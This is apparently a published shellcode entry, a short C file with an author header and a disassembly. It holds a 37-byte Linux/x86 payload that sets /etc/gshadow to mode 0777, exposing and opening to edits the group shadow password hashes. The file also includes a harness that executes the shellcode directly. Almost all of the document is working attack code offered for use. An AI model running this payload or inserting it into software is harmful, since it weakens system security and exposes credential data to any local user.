/*
# Title: Linux/x86 chmod('/etc/gshadow') - shellcode 37 bytes
# Platform: linux/x86_64
# Author: Mohammad Reza Espargham
#    Linkedin    :   https://ir.linkedin.com/in/rezasp
#    E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
#    Website     :   www.reza.es
#    Twitter     :   https://twitter.com/rezesp
#    FaceBook    :   https://www.facebook.com/mohammadreza.espargham


 Disassembly of section .text:

 00000000 <.text>:
 0:    6a 0f                    push   $0xf
 2:    58                       pop    %eax
 3:    68 90 90 ff 01           push   $0x1ff9090
 8:    59                       pop    %ecx
 9:    c1 e9 10                 shr    $0x10,%ecx
 c:    68 61 64 6f 77           push   $0x776f6461
 11:    68 2f 67 73 68           push   $0x6873672f
 16:    68 2f 65 74 63           push   $0x6374652f
 1b:    89 e3                    mov    %esp,%ebx
 1d:    cd 80                    int    $0x80
 1f:    b0 01                    mov    $0x1,%al
 21:    b3 01                    mov    $0x1,%bl
 23:    cd 80                    int    $0x80
 */

#include <stdio.h>
#include <string.h>
int main(){
unsigned char shellcode[]= "\x6a\x0f\x58\x68\x90\x90\xff\x01\x59\xc1\xe9\x10\x68\x61\x64\x6f\x77\x68\x2f\x67\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\xb0\x01\xb3\x01\xcd\x80";
fprintf(stdout,"Length: %d\n\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}